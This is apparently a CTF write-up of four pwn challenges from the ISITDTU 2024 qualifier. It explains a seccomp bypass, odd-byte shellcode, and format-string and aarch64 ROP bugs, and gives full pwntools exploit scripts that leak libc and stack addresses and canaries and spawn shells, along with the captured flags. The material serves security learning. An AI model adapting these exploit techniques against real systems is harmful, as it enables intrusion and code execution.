# Isitdtuctf2024_qual

I participated in ISITDTU 2024 CTF Qual as part of the Megaricano team. As you can see from my previous posts, The Megaricano team is made up of Raon Secure Core Research Team members.

Anyway, I focused on Pwn challenge. Here is All pwn chal write-up.

# Pwn
## shellcode 1
### Analysis
It'a Shellcoding Challenge with a seccomp filter.

```
#  line  CODE  JT   JF      K
# =================================
#  0000: 0x20 0x00 0x00 0x00000004  A = arch
#  0001: 0x15 0x00 0x0a 0xc000003e  if (A != ARCH_X86_64) goto 0012
#  0002: 0x20 0x00 0x00 0x00000000  A = sys_number
#  0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
#  0004: 0x15 0x00 0x07 0xffffffff  if (A != 0xffffffff) goto 0012
#  0005: 0x15 0x06 0x00 0x00000000  if (A == read) goto 0012
#  0006: 0x15 0x05 0x00 0x00000001  if (A == write) goto 0012
#  0007: 0x15 0x04 0x00 0x00000002  if (A == open) goto 0012
#  0008: 0x15 0x03 0x00 0x0000003b  if (A == execve) goto 0012
#  0009: 0x15 0x02 0x00 0x000000f0  if (A == mq_open) goto 0012
#  0010: 0x15 0x01 0x00 0x00000101  if (A == openat) goto 0012
#  0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
#  0012: 0x06 0x00 0x00 0x00000000  return KILL
```
`open`, `read`, `write`, `execve` syscall is blocked.
However, this can be easily bypassed with the `preadv2`, `pwritev2` syscalls.

Analyze the Challenge binary, you can see that it reads the contents from the flag file and copies them to the memory allocated with `mmap`. After that, it allocates executable memory again with mmap, copies the user's shellcode, and executes it.

Since the memory area where the flag contents are stored is adjacent, I gave a huge number as an argument to `pwritev2` and was able to obtain the flag from the output.

### Exploit
```py
from pwn import *

context.arch = 'amd64'
context.os = 'linux'
context.terminal = ['tmux', 'splitw', '-h']

# p = process("./challenge")
p = remote("152.69.210.130", 3001)

p.recvuntil(b": ")
libc_base = int(p.recvline().strip(),16) - 0x606f0 # need to change?
log.info(f"libc_base: {hex(libc_base)}")

sc =  '''
mov rax, 0x147
mov rdi, 3
mov r10, rdx
mov rdx, 0x1
mov [rsi], rdx
addq [rsi], 0x8
mov [rsi+0x8], r10
addq [rsi+0x8], 0x18
movq [rsi+0x10], 0x10000
add rsi, 0x8
mov r10, 0
mov r8, 0
mov r9, 0
syscall
mov rax, 0x148
mov rdi, 0x1
mov rdx, 0x1
mov r10, -1
mov r8, -1
syscall
'''
sc = asm(sc)
p.sendline(sc)
p.interactive()
```
{{< admonition note "flag" true >}}
`ISITDTU{061e8c26e3cf9bfad4e22879994048c8257b17d8}`
{{< /admonition >}}

## shellcode 2
### Analysis
Another Shellcoding Challenge. But this time we have to input shellcode with `odd` number.

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int i; // [rsp+Ch] [rbp-4h]

  init(argc, argv, envp);
  read_flag();
  addr = mmap((void *)0xAABBCC00LL, 0x1000uLL, 7, 34, -1, 0LL);
  if ( addr == (void *)-1LL )
  {
    perror("mmap");
    return 1;
  }
  else
  {
    puts(">");
    read(0, addr, 0x1000uLL);
    for ( i = 0; i <= 4095; ++i )
    {
      if ( (*((_BYTE *)addr + i) & 1) == 0 )
        *((_BYTE *)addr + i) = -112;
    }
    ((void (*)(void))addr)();
    return 0;
  }
}
```
It filter `even` number byte and make it to `\x90` byte which mean `nop` instruction. 

I searched and found a way to generate odd byte shellcode via `r11d` register and was able to solve it by calculating the location of flag global variable via register and then calling `write` syscall.

### Exploit
```py
from pwn import *

# p = process('./challenge')
p =remote('152.69.210.130', 3002)
context.arch = 'amd64'
context.terminal   = ['tmux', 'splitw', '-h']
context.log_level = 'debug'

# sleep(1)

sc = '''
mov r11d, 0x13091309
shr r11, 15
shr r11, 1
sub r13, r11
mov r11d, 0xfffffff1
sub r11d, 0xffffbfb1
add r13, r11
push r13
mov r11d, 0xfffffff1
sub r11d, 0xffffd339
sub r13, r11
pop rdi
call r13
'''
sc = asm(sc)

# gdb.attach(p, '''
# brva 0x13fd 
# ''')

p.sendline(sc)
p.interactive()

```
{{< admonition note "flag" true >}}
`ISITDTU{95acf3a6b3e1afc243fbad70fbd60a6be00541c62c6d651d1c10179b41113bda}`
{{< /admonition >}}

## Game of Luck
### Analysis
```c
void __noreturn main_logic()
{
  unsigned int v0; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v1; // [rsp+8h] [rbp-8h]

  v1 = __readfsqword(0x28u);
  while ( 1 )
  {
    while ( 1 )
    {
      printf("Score: %u points\n", my_point);
      puts("0. Lucky Number\n1. Play\n2. Exit");
      __isoc99_scanf("%1u", &v0);
      while ( getchar() != '\n' )
        ;
      if ( v0 != 68 )
        break;
      vuln();
    }
    if ( v0 > 'D' )
      goto LABEL_13;
    if ( v0 == 2 )
    {
      puts("Goodbye!");
      exit(0);
    }
    if ( v0 > 2 )
    {
LABEL_13:
      puts("Invalid option!");
    }
    else if ( v0 )
    {
      check_input();
    }
    else
    {
      print_lucky();
    }
  }
}
```
It's a Random guess game challenge. 
```c
__int64 check_input()
{
  unsigned int v0; // eax
  int v2; // [rsp+8h] [rbp-8h]

  v0 = clock();
  srand(v0);
  v2 = rand();
  printf("Enter your guess: ");
  if ( (unsigned int)sub_4013BB() != v2 )
  {
    puts("Incorrect!");
    exit(0);
  }
  puts("Correct!");
  if ( ++my_point == 10 )
  {
    vuln();
    exit(0);
  }
  return 0LL;
}
```
Challenge binary set the `rand seed` through the return value of the `clock()` function and check the return value of the rand function and user input.
```c
__int64 vuln()
{
  char buf[264]; // [rsp+0h] [rbp-110h] BYREF
  unsigned __int64 v2; // [rsp+108h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("Enter your name: ");
  read(0, buf, 216uLL);
  printf(buf, (unsigned int)my_point);          // fsb!!
  return 0LL;
}
```
In `vuln()` function you can cleary see fsb.

Looking at this logic, it seems like the vulnerability should be triggered by playing the game.
But if you look closely at the `main_logic`, there is no need to perform this game.

```c
      while ( getchar() != '\n' )
        ;
      if ( v0 != 68 )
        break;
      vuln();
```
In `main_logic`, user input is checked, and if it is `68`, the vuln function is executed.
However, we cannot input 68 through input, and before the `main_logic` function is executed, lucky_number is selected once, and `68` should come out here. And if we give input other than "0,1,2", 68 will be checked as it is, and the `vuln` function can be called.

Leak the libc address and the stack address of ret through fsb, and then trigger fsb again to get a shell with `one_gadget`.

### Exploit
```py
from pwn import *
from ctypes import *

context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]
context.bits = 64

libc = CDLL("./libc.so.6")

while True:
    # p = process("./chal", env={"LD_PRELOAD":"./libc.so.6"})
    p = remote('152.69.210.130', 2004)
    p.recvuntil(b': ')
    lucky_number = int(p.recvline().strip())
    if lucky_number == 68:
        break
    else: 
        p.close()

# gdb.attach(p, '''
# b *0x401596           
# ''')

p.sendline(b'a')
p.sendlineafter(b':', b'%3$p_%5$p')

p.recvuntil(b'0x')
libc_base = int(p.recvuntil(b'_', drop=True), 16) - 0x1147e2
log.info(f"libc: {hex(libc_base)}")

stack_leak = int(p.recvuntil(b'\n', drop=True), 16)
ret_addr = stack_leak + 0x2281
log.info(f"ret_addr: {hex(ret_addr)}")

og = libc_base + 0xebc85
fsb_payload = fmtstr_payload(6, {ret_addr: og}, write_size='short')

p.sendline(b'a')
p.sendlineafter(b':', fsb_payload)

p.interactive()
```
{{< admonition note "flag" true >}}
`ISITDTU{a0e1948f76e189794b7377d8e3b585bfa99d7ed0de7e6a6ff01c2fd95bdf3f72}`
{{< /admonition >}}

## no_name
When I first opened the challenge file, I was a little scared because there was a qemu source code `patch` file and a git command in the Dockerfile to revert qemu to an older version, so I thought it was a qemu escape challenge.

But it was just a patch to apply `ASLR` in qemu, so it was just an aarch64 exploit challenge.😅

### Analysis
```c
void *main_logic()
{
  unsigned int v0; // w0
  int input; // [xsp+18h] [xbp+18h] BYREF
  int flag; // [xsp+1Ch] [xbp+1Ch]
  int i; // [xsp+20h] [xbp+20h]
  int v5; // [xsp+24h] [xbp+24h]

  flag = 0;
  v0 = time(0LL);
  srand(v0);
  v5 = rand() % 10000 + 1;
  puts("=== Secret Number Quest ===");
  puts("Your mission: Guess the secret number (between 1 and 10000):");
  for ( i = 5; i > 0; --i )
  {
    printf("You have %d attempts left\nEnter your guess: ", i);
    __isoc99_scanf("%d", &input);
    if ( v5 == input )
    {
      puts("Huzzah! You've guessed correctly!");
      flag = 1;
      break;
    }
    if ( v5 <= input )
      puts("Too high! Beware of the dragon's fire!");
    else
      puts("Too low! The spirits are not pleased!");
  }
  if ( flag == 1 )
    challenge();
  else
    printf("Game over! The secret number was %d. The quest continues...\n", v5);
  return &_stack_chk_guard;
}
```
Another random guess..! pls stop this..🥲 It's so annoying to perform debugging..

Anyway binary architecture is aarch64, we have to debug it with `gdb-multiarch` and `qemu-user-static`
You will also need to install `libc6-arm64-cross` to match library dependencies.

However, since there is an inevitable time difference between running the exploit code and `gdb-multiarch`, I skipped the test by setting a breakpoint at the random check logic and modifying the register value.

```c
void *challenge()
{
  int v1; // [xsp+18h] [xbp+18h]
  char buf[72]; // [xsp+20h] [xbp+20h] BYREF

  v1 = 0;
  puts("=== Magic Rune Challenge ===");
  puts("Your quest: Change the mystical value of 'check' to 0xdeadbeef!");
  fflush(stdout);
  while ( v1 <= 1 )
  {
    printf("Input a magic string to cast your spell: ");
    read(0, buf, 64uLL);
    buf[strcspn(buf, "\n")] = 0;
    printf(buf);                                // fsb!!
    putchar(10);
    printf("Alas! Your magic failed. 'check' is still 0x%08x.\n", 0x4030201);
    ++v1;
  }
  return &_stack_chk_guard;
}
```
When you guess a random number and goto another challenge function, there is a logic like the above. You must change the `check` variable on the stack to the value `0xdeadbeef` through `fsb`.

Since we have `2 chances` to trigger fsb, we can just leak all the values(`stack`, `libc`, `canary`) ​​we need in the first one and write the values ​​to the stack address in the second one.

And in the above function, it calls a function that can trigger `bof` by changing the check variable on the stack to `0xdeadbeef`, although it is hidden due to `IDA's optimization`.🤔

```c
.text:0000000000000D0C                 LDR             W1, [SP,#0x70+check]
.text:0000000000000D10                 MOV             W0, #0xDEADBEEF
.text:0000000000000D18                 CMP             W1, W0
.text:0000000000000D1C                 B.NE            loc_D28
.text:0000000000000D20                 BL              trigger_bof

void *trigger_bof()
{
  _BYTE buf[128]; // [xsp+18h] [xbp+18h] BYREF

  puts("You've successfully deciphered the ancient runes!");
  puts("Congratulations, brave adventurer! You've unlocked the secret treasure!");
  printf("Give me your name: ");
  fflush(stdout);
  read(0, buf, 0x400uLL);
  return &_stack_chk_guard;
}
```

The challenge can be solved by performing `ROP` in this function using the information leaked in the previous step.
`ASLR` isn't a big problem since we can just leak all the addresses.

### Exploit
```py
from pwn import *
from ctypes import *

context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]
context.arch = 'aarch64'
context.bits = 64

# p = process(['qemu-aarch64-static', '-g', '1234' , '-L', '/usr/aarch64-linux-gnu', './chall'])
# p = process(['qemu-aarch64-static', '-L', '/usr/aarch64-linux-gnu', './chall'])

p = remote('152.69.210.130', 1337)
libc = ELF('/usr/aarch64-linux-gnu/lib/libc.so.6')
libc_handle = CDLL('libc.so.6')

libc_handle.srand(libc_handle.time(0))
rand_val = libc_handle.rand() % 10000 + 1

p.sendlineafter(b': ', str(rand_val).encode())
# p.sendlineafter(b': ', b'a' * 8 + b'%p_' * 20)
p.sendlineafter(b'spell:', b'%5$p_%27$p_%33$p')

p.recvuntil(b'0x')
stack_leak = int(p.recvuntil(b'_', drop=True), 16)
log.info(f"stack_leak: {hex(stack_leak)}")

canary = int(p.recvuntil(b'_', drop=True), 16)
log.info(f"canary: {hex(canary)}")

libc_base = int(p.recvuntil(b'\n', drop=True), 16) - 0x274cc
log.info(f"libc_base: {hex(libc_base)}")

check = stack_leak + 0x26fb
log.info(f"check: {hex(check)}")

fsb_payload = fmtstr_payload(12, {check: 0xdeadbeef}, write_size='short')
p.sendlineafter(b'spell:', fsb_payload)

binsh = libc_base + libc.search(b'/bin/sh').__next__()
log.info(f"binsh: {hex(binsh)}")
system = libc_base + libc.symbols['system']
log.info(f"system: {hex(system)}")
gadget1 = libc_base + 0x00000000000d20a4 # ldp x21, x30, [sp, #0x10] ; ldp x19, x20, [sp], #0x20 ; ret
gadget2 = libc_base + 0x00000000000e33e0 # mov x0, x20 ; blr x21

payload = b'a' * 128 + p64(canary) + b'a' * 0x8 + p64(gadget1) + b'A' * 0x58 + p64(canary) + b'A' * 0x8 + p64(binsh) + p64(system) + p64(gadget2)

p.sendlineafter(b'name:', payload)

p.interactive()
```
{{< admonition note "flag" true >}}
`ISITDTU{a3728bf1d6fc2f1bcfec6d0b64bca566a5149f52}`
{{< /admonition >}}
